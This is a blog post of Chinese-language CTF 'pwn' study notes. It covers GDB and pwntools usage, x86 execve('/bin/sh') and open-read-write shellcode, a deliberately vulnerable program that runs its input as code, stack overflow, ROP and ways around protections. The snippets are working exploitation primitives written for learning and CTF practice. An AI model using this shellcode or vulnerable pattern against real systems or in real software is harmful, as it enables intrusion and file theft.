---
title: Pwn
date: 2018-09-12 21:26:33
tags: [pwn,assembly language]
categories: [pwn]
description: <center>pwn学习笔记</center>
copyright: true
photo: "http://r.photo.store.qq.com/psb?/V13BnVsC23MbK8/VuQdsdb8MDhTpJD.5Kj4qlFJivW6JHcd03YWUuPZp9I!/r/dMIAAAAAAAAA"
---
---
# Basic Knowledge
·Reverse Engineering
·Exploit
·x86 Assembly


**·Reverse Engineering**
Binary to Source code
通过逆向工程来发现漏洞
静态分析（不运行程序来分析代码）：
	工具：
		IDA Pro
		objdump命令
动态分析（运行程序来分析代码）：
	工具：
		strace命令（跟踪系统函数调用）usage: strace fileaddress
		Itrace命令（跟踪所有库调用, library函数）usage:ltrace fileaddress



**·Exploit**
Vulnerability to Control flow
利用漏洞攻击取得程序控制权
即pwn
Useful Tools
1. IDA PRO
2. GDB
	```
	usage: gdb -q ./a.out
	            run(r)--运行
	            disas function_name--反编译某个function
	            break(b) *0x80488014--设置断点
	            info b--查看断点
	            info r--查看寄存器状态
	            ni--next instruction
	            si--step into
	            backtrace(bt)--显示上一层所有stack frame信息
	            continue(c)--继续执行到下一个断点
	            x/wx address--查看address中的内容
		w可以换成b/h/g分别对应1/2/8 Byte
		/后可以接数字，表示一次列出几个
		第二个x可以换成u/d/s/i 以不同方式表示
			u：unsigned int
			d：10进制
			s：字符串
			i：指令
	            set *address = value
		将address中的值设置为value，一次设4byte
		可以将*换成（char/short/long）分别表示 1/2/8 byte
		eg:
			set *0x8048a060 = 0xdeadbeef
			set {int}0x8048a060 = 1337
			set $eax = $edx(寄存器间)
	            list--列出源代码
	            print val--打印变量值
	            info local--显示局部变量
	            attach pid--附近加一个正在运行的程序
	            可以配合ncat或socat进行exploit的调试
		ncat -ve ./a.out -kl 8888
		echo 0 > /proc/sys/kernel/yama/ptrace_scope
		elfsymbol--查看function的plt，做ROP时特别有用
		vmmap--查看process mapping信息，可以看到每个address的权限
		readelf--查看section位置
		find(alias searchmem)--在内存中查找信息，通常用来搜索字符串（例如：/bin/sh）
		```
3. Qira
	```
	usage: qira -s ./filename
	```
4. Pwntools
	```
	Basic structure :
	from pwn import *
	r = remote('127.0.0.1',4000)  //地址可变，也可以直接是程序名
	r.sendline(...)               //传入程序的内容，若传入地址，需写成如：p32(0x111)格式
	r.interactive()
	```
---

# Shellcode
**·System Call**
   通过汇编程序来执行系统的命令
   EAX: system call number/ return value
   EBX,ECX,EDX,ESI,EDI: argument 
   Instruction: int 0x80
   System Call查看网址（Linux）：http://syscalls.kernelgork.com/
   Example: execve("/bin/sh",NULL,NULL)
    ```avrasm
    x86 Assembly
    //该程序实现了execve("/bin/sh",NULL,NULL)//
    push 0x0068732f
    push 0x6e69622f
    mov ebx,esp
    mov eax 0xb
    mov ecx 0x0     //xor ecx,ecx
    mov edx,0x0     //xor edx,edx
    int 0x80
    //但该程序不是常用的写法，只做试例//
    ```

	```avrasm
   	//下面是一个常见的写法//
    jmp sh
    run:
      pop ebx
      mov BYTE [ebx+7],0 //将内存中“/bin/sh”后面一个内存单元设置为0，作为作为该字符串的结束标志
      xor eax,eax
      mov al,11
      xor ecx,ecx
      xor edx,edx
      int 0x80
    sh:
      call run
      db "/bin/sh"
    ```
   使该汇编程序在c中调用
   ```cpp
   //首先编译上面的汇编程序
   ·nasm a.asm -o a.o -felf32
   //将a.o转化为16进制文件
   ·objcopy -O binary a.o code
   ·xxd -i code
   ·xxd -i code > code.h        //转化为头文件
   //编写和运行C文件
   ·#include "code.h"
    typedef int (*CODE)();      //定义一个返回值为int，不带参数的函数指针
    int main()
    {
    	((CODE)code)();
    }
   //编译
   ·gcc test.c -o test -m32 -zexecstack
   //再编写一个程序vul.c，编译一下
   ·#include<unistd.h>
    char code[200];
    typedef int (*CODE)();
  
    int main()
    {
           read(0,code,100);
           ((CODE)code)();
           return 0;
    }
   //将scode的输出作为输入传给vul
   ·(cat scode;cat) | ./vul

   ```
   在很多时候我们不能直接拿到shell，尤其是在做CTF的时候，Flag会保存在一个文件中，那么此时我们需要：
   Open这个文件
   Read这个文件
   Write这个文件
   ```avrasm
   //写一个OWR的汇编程序（参照上例）
    jmp file 
    open:
    	pop ebx
    	xor eax,eax
    	mov al,5           //open操作
    	xor ecx,ecx
    	int 0x80

    	mov ebx,eax
    	mov al,3           //read操作
    	mov ecx,esp
    	mov dl,0x30
    	int 0x80

    	mov al,4           //write操作
    	mov bl,1
    	mov dl,0x30
    	int 0x80

    	xor eax,eax
    	inc eax            //exit操作
    	int 0x80

    file:
    	call open
    	db '/etc/passwd',0x0
   ```
   然后参照上例操作

---
# Stack Overflow
·又称stack smashing
·利用方式简单，可直接覆盖return address和控制参数

**·Return to Text**
控制程序的返回地址到原本程序中的函数（代码）
1）例如程序中有类似function：
	```
	system('/bin/sh')
	execve('/bin/sh',NULL,NULL)
	```
就可以通过地址直接跳转到function
2）如果数据段上是可执行并且位置固定的话，可以先在数据段上写入shellcode，然后再跳转到数据段上执行。

---
# ROP
一种利用现有的程序片段组合出想要的功能的技巧
1）控制ROP行为的code是“Stack上排列的内容”
Gadget：一小段以ret结尾的code
ROP Chain：串联在一起的gadget，组合出需要的功能
{% asset_img ROPchain.png %}
Gadget执行完后，还可以继续return
只要在stack上按正确的顺序排列好每个gadget的address和对应的stack frame，就可以执行复杂的功能了
2）使用ROP的关键：
	查找gadget
	排列gadget
3）ROP类型：
	控制寄存器做syscall
	使用原有程序里的函数
	使用libc里的gadget或者函数（绕过ASLR）
	
## Protection
·一般pwn题会有保护措施如：ASLR,DEP,PIE,StackGuard

**·ASLR**
地址随机化
每次执行时，stack、heap、library位置都不一样
检查是否开启ASLR：
```
cat /proc/sys/kernel/randomize_va_space
```

**·DEP**
数据执行保护，又称NX
可写的不可以执行，可执行的不可写

**·PIE**
地址无关可执行文件
	gcc在默认情况下没有开启，编译时加上-fPIC-pie就可以开启
	没开启的情况下程序的data段以及code段会是固定的
	一旦开启之后data以及code也会跟着ASLR，因此前面说的ret2text/shellcode没有固定的位置可以跳，就变得困难很多。

**·Stack Guard**
编译器对stack overflow的一种保护机制
在函数被调用的时候，先在stack上放canary
函数返回前先检查这个值有没有被修改
可以有效地防止缓冲区溢出攻击
{% asset_img stack.png %}
如图我们可以看到，在栈中EBP上面有一个canary栈溢出保护，程序在执行返回地址时，会先检查canary的值是否变化，所以若是有栈溢出攻击就会被识别。
因此要绕过Stack Guard保护，可以先把Canary的值提取出来，在栈溢出攻击时保持canary的值不变，由此实现栈溢出

### DEP(NX)
1）```
   ROPgadget --binary ./filename       //查找文件中的‘pop eax(ebx)(ecx)(edx) ; ret’
   ROPgadget --binary filename --opcode cd80c3
   ROPgadget --binary rop  --only 'int'
   cd80c3                              //int 0x80;ret
   ROPgadget --binary ./filename  --only 'pop|ret' | grep 'eax' //只查找‘pop eax ; ret’
   ROPgadget --binary rop  --string '/bin/sh'   //查找文件里是否有/bin/sh
   ```

# 留坑待填